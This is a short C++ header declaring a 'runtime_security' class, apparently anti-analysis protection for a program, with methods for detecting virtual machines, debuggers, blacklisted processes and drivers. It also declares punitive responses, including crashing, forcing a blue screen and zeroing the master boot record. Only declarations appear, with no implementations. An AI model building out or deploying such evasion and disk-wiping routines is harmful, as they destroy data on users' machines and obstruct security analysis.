#pragma once

namespace security
{
	class runtime_security
	{
	protected:
		auto check_for_virtual_machine( ) -> void;
		auto check_vm_files( ) -> void;
		auto check_for_debugger( ) -> void;
		auto process_blacklist( ) -> void;
		auto check_for_drivers( ) -> void;
		auto crash_program( ) -> void;
		auto zero_mbr( ) -> void;
		auto bsod( ) -> void;


	public:
		auto start( ) -> void;
		auto security_callback( const std::string reason, const std::string type ) -> void;
	};
}

inline const auto security_ = std::make_unique<security::runtime_security>( );